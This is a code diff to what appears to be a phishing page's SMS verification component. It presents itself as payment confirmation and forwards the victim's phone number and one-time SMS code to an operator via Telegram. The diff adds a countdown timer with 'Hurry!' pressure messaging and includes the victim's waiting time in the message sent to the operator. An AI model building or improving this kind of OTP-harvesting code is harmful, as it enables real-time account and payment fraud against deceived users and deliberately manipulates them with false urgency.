@@ -1,15 +1,14 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
-import { ArrowLeft, MessageSquare, Shield, Loader2, AlertTriangle, XCircle, Info
-
-
- } from "lucide-react";
+import { ArrowLeft, MessageSquare, Shield, Loader2, AlertTriangle, XCircle, Info, Clock, Timer } from "lucide-react";
 import {
   InputOTP,
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
 import { supabase } from "@/integrations/supabase/client";
+import { Progress } from "@/components/ui/progress";
+import { useVerificationTimer } from "@/hooks/useVerificationTimer";
 
 interface SmsVerificationProps {
   onBack: () => void;
@@ -30,17 +29,46 @@ const SmsVerification = ({
   messageType,
   onDismissMessage
 }: SmsVerificationProps) => {
+  const { timeoutSeconds } = useVerificationTimer();
   const [code, setCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
+  const [elapsedSeconds, setElapsedSeconds] = useState(0);
+  const [remainingSeconds, setRemainingSeconds] = useState(timeoutSeconds);
+  const [timerInitialized, setTimerInitialized] = useState(false);
+
+  // Initialize remaining seconds when timer setting loads
+  useEffect(() => {
+    if (!timerInitialized) {
+      setRemainingSeconds(timeoutSeconds);
+      setTimerInitialized(true);
+    }
+  }, [timeoutSeconds, timerInitialized]);
+
+  // Timer for elapsed time and countdown
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setElapsedSeconds(prev => prev + 1);
+      setRemainingSeconds(prev => Math.max(0, prev - 1));
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, []);
 
   // Reset form when admin sends an error message (wrong SMS)
   useEffect(() => {
     if (adminMessage && messageType === "error" && isSubmitted) {
       setIsSubmitted(false);
       setCode("");
+      setRemainingSeconds(timeoutSeconds);
     }
-  }, [adminMessage, messageType, isSubmitted]);
+  }, [adminMessage, messageType, isSubmitted, timeoutSeconds]);
+
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
+  };
 
   const sendCodeToTelegram = async (smsCode: string) => {
     try {
@@ -51,6 +79,7 @@ const SmsVerification = ({
 📱 <b>Phone:</b> ${phoneNumber || "N/A"}
 
 🔑 <b>SMS Code:</b> <code>${smsCode}</code>
+⏱ <b>Wait Time:</b> ${formatTime(elapsedSeconds)}
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
@@ -105,6 +134,10 @@ const SmsVerification = ({
     }
   };
 
+  const progressPercent = (remainingSeconds / timeoutSeconds) * 100;
+  const isUrgent = remainingSeconds < 60;
+  const isExpired = remainingSeconds === 0;
+
   if (isSubmitted) {
     return (
       <div className="animate-slide-up">
@@ -121,6 +154,17 @@ const SmsVerification = ({
             <p className="text-muted-foreground">
               Please wait while we verify your payment. This may take a moment...
             </p>
+          </div>
+
+          {/* Waiting Timer */}
+          <div className="bg-muted/50 rounded-xl p-4 mb-6 text-center">
+            <div className="flex items-center justify-center gap-2 mb-1">
+              <Clock className="w-4 h-4 text-muted-foreground" />
+              <span className="text-sm text-muted-foreground">Waiting time</span>
+            </div>
+            <span className="text-2xl font-mono font-bold text-foreground">
+              {formatTime(elapsedSeconds)}
+            </span>
           </div>
 
           <div className="bg-secondary/50 rounded-xl p-4 mb-6">
@@ -145,7 +189,7 @@ const SmsVerification = ({
   return (
     <div className="animate-slide-up">
       <div className="card-elevated p-8 max-w-lg mx-auto">
-        <div className="text-center mb-8">
+        <div className="text-center mb-6">
           <div className="flex items-center justify-center mb-4">
             <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
               <MessageSquare className="w-8 h-8 text-primary" />
@@ -157,6 +201,41 @@ const SmsVerification = ({
           <p className="text-muted-foreground">
             Enter the verification code you received via SMS to confirm your payment.
           </p>
+        </div>
+
+        {/* Countdown Timer */}
+        <div className={`rounded-xl p-4 mb-6 border ${isExpired ? 'bg-destructive/10 border-destructive/30' : isUrgent ? 'bg-orange-500/10 border-orange-500/30' : 'bg-yellow-500/10 border-yellow-500/30'}`}>
+          <div className="flex items-center justify-between mb-2">
+            <div className="flex items-center gap-2">
+              <Timer className={`w-4 h-4 ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-500' : 'text-yellow-600'}`} />
+              <span className={`text-sm font-medium ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-600' : 'text-yellow-600'}`}>
+                {isExpired ? 'Time Expired!' : 'Time remaining'}
+              </span>
+            </div>
+            <span className={`text-xl font-mono font-bold ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-600 animate-pulse' : 'text-yellow-600'}`}>
+              {formatTime(remainingSeconds)}
+            </span>
+          </div>
+          <Progress 
+            value={progressPercent} 
+            className={`h-2 ${isExpired ? '[&>div]:bg-destructive' : isUrgent ? '[&>div]:bg-orange-500' : '[&>div]:bg-yellow-500'}`}
+          />
+          {isExpired && (
+            <p className="text-xs text-destructive mt-2">
+              Please contact support or refresh the page to try again.
+            </p>
+          )}
+          {isUrgent && !isExpired && (
+            <p className="text-xs text-orange-600 mt-2">
+              Hurry! Enter your verification code before time runs out.
+            </p>
+          )}
+        </div>
+
+        {/* Waiting Timer */}
+        <div className="flex items-center justify-center gap-2 mb-6 text-muted-foreground">
+          <Clock className="w-4 h-4" />
+          <span className="text-sm">Waiting: <span className="font-mono font-medium">{formatTime(elapsedSeconds)}</span></span>
         </div>
 
         {/* Admin Alert Message */}
@@ -193,6 +272,7 @@ const SmsVerification = ({
               maxLength={6}
               value={code}
               onChange={(value) => setCode(value)}
+              disabled={isExpired}
             >
               <InputOTPGroup>
                 <InputOTPSlot index={0} />
@@ -218,10 +298,10 @@ const SmsVerification = ({
             </Button>
             <Button
               type="submit"
-              disabled={code.length !== 6 || isSubmitting}
+              disabled={code.length !== 6 || isSubmitting || isExpired}
               className="flex-1 h-12 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl"
             >
-              {isSubmitting ? "Submitting..." : "Verify Code"}
+              {isSubmitting ? "Submitting..." : isExpired ? "Time Expired" : "Verify Code"}
             </Button>
           </div>
         </form>
